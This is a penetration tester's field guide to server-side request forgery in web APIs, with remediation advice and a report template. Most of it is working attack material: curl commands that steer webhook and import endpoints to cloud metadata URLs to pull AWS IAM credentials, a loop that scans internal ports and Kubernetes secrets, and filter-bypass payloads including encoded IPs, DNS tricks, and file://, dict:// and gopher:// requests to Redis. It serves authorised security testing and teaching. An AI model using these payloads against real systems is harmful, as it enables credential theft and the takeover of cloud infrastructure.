# SSRF in APIs — Enterprise Penetration Testing Field Notes

> **Author:** Dheeraj Kumar Jayaswal — Senior Penetration Tester | 5+ Years Enterprise AppSec
>
> **Category:** API Security — OWASP API7:2023 Server Side Request Forgery
>
> **Severity:** High to Critical — cloud metadata credential theft, internal service access, full infrastructure compromise
>
> **Real-world impact:** SSRF in APIs is the highest-impact individual finding I regularly demonstrate in enterprise cloud-hosted engagements. The attack pattern is simple: the API fetches a URL on behalf of the user, and I provide the cloud metadata endpoint instead of a legitimate URL. On AWS with IMDSv1 still enabled — which remains common in enterprise EC2 deployments — this returns temporary IAM credentials in one request. Those credentials carry whatever permissions the application was given when it was deployed: often S3 read/write, RDS access, SQS, and sometimes IAM itself.

---

## 🧠 Why API Endpoints Are Rich SSRF Targets

```
SSRF-vulnerable API patterns in enterprise applications:

URL-fetching features built for legitimate purposes:
  POST /api/v1/webhooks          → "test my webhook URL"
  POST /api/v1/documents/import  → "import document from URL"
  PUT  /api/v1/users/avatar      → "set profile picture from URL"
  POST /api/v1/reports/publish   → "publish report to URL"
  POST /api/v1/integrations      → "connect to partner API endpoint"
  POST /api/v1/preview           → "generate link preview card"
  POST /api/v1/notifications/send → "send to webhook endpoint"

What makes APIs particularly susceptible:
  → API endpoints accept JSON bodies where URL values are easy to inject
  → Developer intent is for server to fetch external URLs
  → No browser-side restriction — purely server-side operation
  → WAF rules for web often don't inspect API JSON bodies
  → Error responses frequently reveal response content

Cloud metadata targets:
  AWS EC2:  http://169.254.169.254/latest/meta-data/
  Azure VM: http://169.254.169.254/metadata/instance
  GCP:      http://metadata.google.internal/computeMetadata/v1/
```

---

## 🔍 Phase 1 — Finding SSRF Injection Points in APIs

```bash
BASE="https://api.company.com"

# In Burp HTTP History — search for these parameter names:
# url, URL, uri, URI, src, source, dest, destination, redirect,
# feed, host, path, resource, fetch, load, import, request,
# image, img, avatar, logo, icon, callback, webhook, proxy, endpoint

# Common API request patterns to test:
echo "=== SSRF Parameter Discovery ==="

# Webhook configuration:
curl -s -X POST "$BASE/api/v1/webhooks" \
  -H "Authorization: Bearer TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"url": "https://COLLABORATOR-URL", "events": ["payment.success"]}'

# Document import:
curl -s -X POST "$BASE/api/v1/documents/import" \
  -H "Authorization: Bearer TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"source_url": "https://COLLABORATOR-URL/doc.pdf"}'

# Avatar/image import:
curl -s -X PUT "$BASE/api/v1/users/me/avatar" \
  -H "Authorization: Bearer TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"avatar_url": "https://COLLABORATOR-URL/img.jpg"}'

# Integration endpoint:
curl -s -X POST "$BASE/api/v1/integrations/slack" \
  -H "Authorization: Bearer TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"webhook_url": "https://COLLABORATOR-URL"}'
```

---

## 💥 Phase 2 — Cloud Metadata Exploitation

### AWS IMDSv1 Full Exploitation Chain

```bash
# Step 1: Confirm AWS hosting
curl -sI "$BASE" | grep -iE "x-amzn|x-amz|cloudfront"
# OR from error messages, or S3 URLs in responses

# Step 2: Test basic SSRF confirmation with Burp Collaborator
# If Collaborator receives HTTP request → SSRF confirmed → proceed

# Step 3: Access metadata root
curl -s -X POST "$BASE/api/v1/webhooks/test" \
  -H "Authorization: Bearer TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"url": "http://169.254.169.254/latest/meta-data/"}'
# Expected response (if SSRF works): ami-id, hostname, iam/...

# Step 4: Find the IAM role name
curl -s -X POST "$BASE/api/v1/webhooks/test" \
  -H "Authorization: Bearer TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"}'
# Response: EC2-Production-WebApp-Role

# Step 5: Extract temporary credentials
ROLE="EC2-Production-WebApp-Role"
curl -s -X POST "$BASE/api/v1/webhooks/test" \
  -H "Authorization: Bearer TOKEN" \
  -H "Content-Type: application/json" \
  -d "{\"url\": \"http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE\"}"
# Response:
# {
#   "Code": "Success",
#   "AccessKeyId": "ASIA5XXXXXXXXXXXXXXXX",
#   "SecretAccessKey": "wJalrXUtnFEMI/K7MDENG/...",
#   "Token": "FQoGZXIvYXdz...",
#   "Expiration": "2025-05-01T12:00:00Z"
# }

# Step 6: Verify credentials (do not use beyond identity confirmation)
export AWS_ACCESS_KEY_ID="ASIA5XXXXXXXXXXXXXXXX"
export AWS_SECRET_ACCESS_KEY="..."
export AWS_SESSION_TOKEN="FQoGZXIv..."
aws sts get-caller-identity
# → Shows which account and role: arn:aws:iam::123456789:role/EC2-Production-WebApp-Role

# Document: role permissions determine blast radius
# Common enterprise EC2 role permissions: S3 read/write, RDS, SQS, Secrets Manager
```

### Additional High-Value Metadata Paths

```bash
# User data (startup scripts — often contain credentials):
d '{"url": "http://169.254.169.254/latest/user-data"}'

# Internal IP address (network mapping):
d '{"url": "http://169.254.169.254/latest/meta-data/local-ipv4"}'

# Instance identity (full instance profile):
d '{"url": "http://169.254.169.254/latest/dynamic/instance-identity/document"}'

# Azure IMDS (requires Metadata: true header — test if API passes headers):
d '{"url": "http://169.254.169.254/metadata/instance?api-version=2021-02-01"}'
# Note: Azure requires Metadata: true header — may need header injection via API

# GCP metadata:
d '{"url": "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"}'
# Note: GCP requires Metadata-Flavor: Google header
```

---

## 💥 Phase 3 — Internal Service Discovery via SSRF

```bash
# Once SSRF is confirmed, map internal services:

# Common internal ports to probe:
declare -A PORTS=(
  [22]="SSH"
  [80]="HTTP"
  [443]="HTTPS"
  [3306]="MySQL"
  [5432]="PostgreSQL"
  [6379]="Redis"
  [8080]="Internal HTTP"
  [8443]="Internal HTTPS"
  [9200]="Elasticsearch"
  [27017]="MongoDB"
  [2375]="Docker API"
)

for port in 22 80 443 3306 5432 6379 8080 9200 27017 2375; do
  response=$(curl -s -X POST "$BASE/api/v1/webhooks/test" \
    -H "Authorization: Bearer TOKEN" \
    -H "Content-Type: application/json" \
    -d "{\"url\": \"http://127.0.0.1:$port/\"}" 2>/dev/null)
  # Different responses for open vs closed ports
  echo "Port $port: $(echo $response | head -c 100)"
done

# Internal Kubernetes API:
curl -s -X POST "$BASE/api/v1/webhooks/test" \
  -H "Authorization: Bearer TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"url": "http://10.96.0.1/api/v1/secrets"}'
# If secrets returned = K8s API unauthenticated = Critical
```

---

## 💥 Phase 4 — SSRF Filter Bypass Techniques

```bash
# When naive IP blocklist is present:

# Bypass 1: Decimal IP encoding
d '{"url": "http://2130706433/"}'           # 127.0.0.1 in decimal
d '{"url": "http://0177.0.0.1/"}'           # 127.0.0.1 in octal
d '{"url": "http://0x7f000001/"}'           # 127.0.0.1 in hex

# Bypass 2: IPv6
d '{"url": "http://[::1]/"}'               # IPv6 localhost
d '{"url": "http://[::ffff:127.0.0.1]/"}'  # IPv4-mapped IPv6

# Bypass 3: DNS services resolving to internal IPs
d '{"url": "http://127.0.0.1.nip.io/"}'
d '{"url": "http://localtest.me/"}'         # always resolves to 127.0.0.1

# Bypass 4: Open redirect on trusted domain
# If allowlist permits *.company.com:
d '{"url": "https://trusted.company.com/redirect?url=http://169.254.169.254/"}'

# Bypass 5: Protocol switching
d '{"url": "file:///etc/passwd"}'          # local file read
d '{"url": "dict://127.0.0.1:6379/info"}'  # Redis INFO via dict://
d '{"url": "gopher://127.0.0.1:6379/_INFO\r\n"}'  # Redis via Gopher
```

---

## 🗂️ Systematic Testing Checklist

```
SSRF POINT DISCOVERY
☐ Search Burp HTTP History for: url, src, source, endpoint, webhook, import
☐ Check all POST bodies for URL-type fields
☐ Test webhook, import, preview, integration API features
☐ Check image/avatar URL import features

BASIC CONFIRMATION (out-of-band)
☐ Inject Burp Collaborator URL in all URL parameters
☐ Monitor for HTTP/DNS interactions in Collaborator
☐ If interaction received → SSRF confirmed → proceed

CLOUD METADATA (if cloud-hosted)
☐ AWS: http://169.254.169.254/latest/meta-data/
☐ AWS IAM: /latest/meta-data/iam/security-credentials/
☐ Azure: /metadata/instance?api-version=2021-02-01
☐ GCP: http://metadata.google.internal/computeMetadata/v1/

INTERNAL SERVICES
☐ Probe ports 22,80,443,3306,5432,6379,8080,9200,27017,2375
☐ Test Kubernetes API: http://10.96.0.1/api/v1/
☐ Test Docker API: http://127.0.0.1:2375/v1.24/containers/json

FILTER BYPASS (if basic test blocked)
☐ Decimal IP: http://2130706433/
☐ Hex IP: http://0x7f000001/
☐ Octal IP: http://0177.0.0.1/
☐ IPv6 localhost: http://[::1]/
☐ DNS resolution bypass (nip.io, localtest.me)
☐ file:// and dict:// protocols
```

---

## 📋 Enterprise Pentest Report Template

**Finding Title:** SSRF in Webhook Test Endpoint — AWS IAM Credentials Exposed via Cloud Metadata

**Severity:** Critical | **CVSS v3.1:** 9.8 (AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H)

**Affected Endpoint:** `POST /api/v1/webhooks/test` — `url` parameter

```
Step 1 — Confirm SSRF with Burp Collaborator:
  POST /api/v1/webhooks/test
  {"url": "https://xyz.burpcollaborator.net"}
  → HTTP interaction received from [SERVER_IP] at [TIMESTAMP]

Step 2 — Access AWS metadata:
  {"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"}
  → Response: "EC2-Production-WebApp-Role"

Step 3 — Extract credentials:
  {"url": "http://169.254.169.254/.../EC2-Production-WebApp-Role"}
  → Response: {"AccessKeyId":"ASIA5XXX...","SecretAccessKey":"wJalrX...","Token":"FQoGZX..."}

Step 4 — Confirm credential validity (scope: identity only):
  aws sts get-caller-identity
  → {"UserId":"AROAXXXXXXXXX","Account":"123456789012",
     "Arn":"arn:aws:iam::123456789012:role/EC2-Production-WebApp-Role"}

AWS permissions attached to role (from IAM policy review):
  s3:GetObject, s3:PutObject on all company buckets
  rds:connect on production database
  secretsmanager:GetSecretValue — all secrets
  → Full production database access, all S3 buckets, all application secrets

Impact:
  Complete AWS environment compromise via one API request.
  Production database credentials, application secrets, and all S3 data accessible.
  Immediate credential rotation required across all AWS services.

Remediation:
  Immediate: Rotate all IAM credentials for EC2-Production-WebApp-Role
  Immediate: Enable IMDSv2 on all EC2 instances (require PUT token)
  Immediate: Block 169.254.169.254 at VPC security group level
  Short-term: Validate webhook URLs against strict allowlist before fetching
  Short-term: Resolve to IP before fetch — block RFC1918/169.254.x.x ranges
  Long-term: Replace webhook test feature with client-side fetch (remove server fetch)
```

---

## 🧭 Key Takeaways

**1. Cloud metadata SSRF is the single highest-impact finding path in cloud-hosted enterprise.**
One request to `169.254.169.254` via a vulnerable API endpoint returns IAM credentials with whatever permissions the application was granted at deployment. Enterprise EC2 instances are often over-privileged for convenience. The attack surface is enormous and the impact is immediate.

**2. Webhooks are the most reliable SSRF injection point in enterprise SaaS APIs.**
Every enterprise integration has webhooks. They are built to make the server call external URLs. Developers rarely consider that "external" should not include the internal network or metadata service. Test every webhook endpoint — it is the closest thing to a guaranteed SSRF injection point.

**3. Blind SSRF via Burp Collaborator is safe and always sufficient for the finding.**
Never probe cloud metadata without first confirming SSRF via Collaborator. The Collaborator DNS/HTTP interaction is the safe, professional PoC. Once confirmed, one metadata endpoint request for the IAM role name, one for credentials — then stop. `aws sts get-caller-identity` to confirm validity. Screenshot and report.

**4. IMDSv2 is not always a complete fix — document both findings separately.**
IMDSv2 requires a PUT request to obtain a session token before metadata access. This blocks simple GET-based SSRF. However: if the vulnerable API proxies both GET and PUT (full HTTP proxy features), IMDSv2 can still be bypassed. Report SSRF and IMDSv2 configuration status as separate findings.

---

## 🔗 References
- [OWASP API7:2023 — Server Side Request Forgery](https://owasp.org/API-Security/editions/2023/en/0xa7-server-side-request-forgery/)
- [OWASP SSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)
- [AWS IMDSv2 Migration](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html)
- [PayloadsAllTheThings — SSRF](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery)

---
<div align="center">

*Part of [AppSec From The Trenches](../README.md) — Real notes from 6+ years of enterprise penetration testing.*

[![LinkedIn](https://img.shields.io/badge/LinkedIn-Dheeraj%20Kumar%20Jayaswal-0077B5?style=flat-square&logo=linkedin&logoColor=white)](https://linkedin.com/in/dheerajkumarjayaswal)

</div>
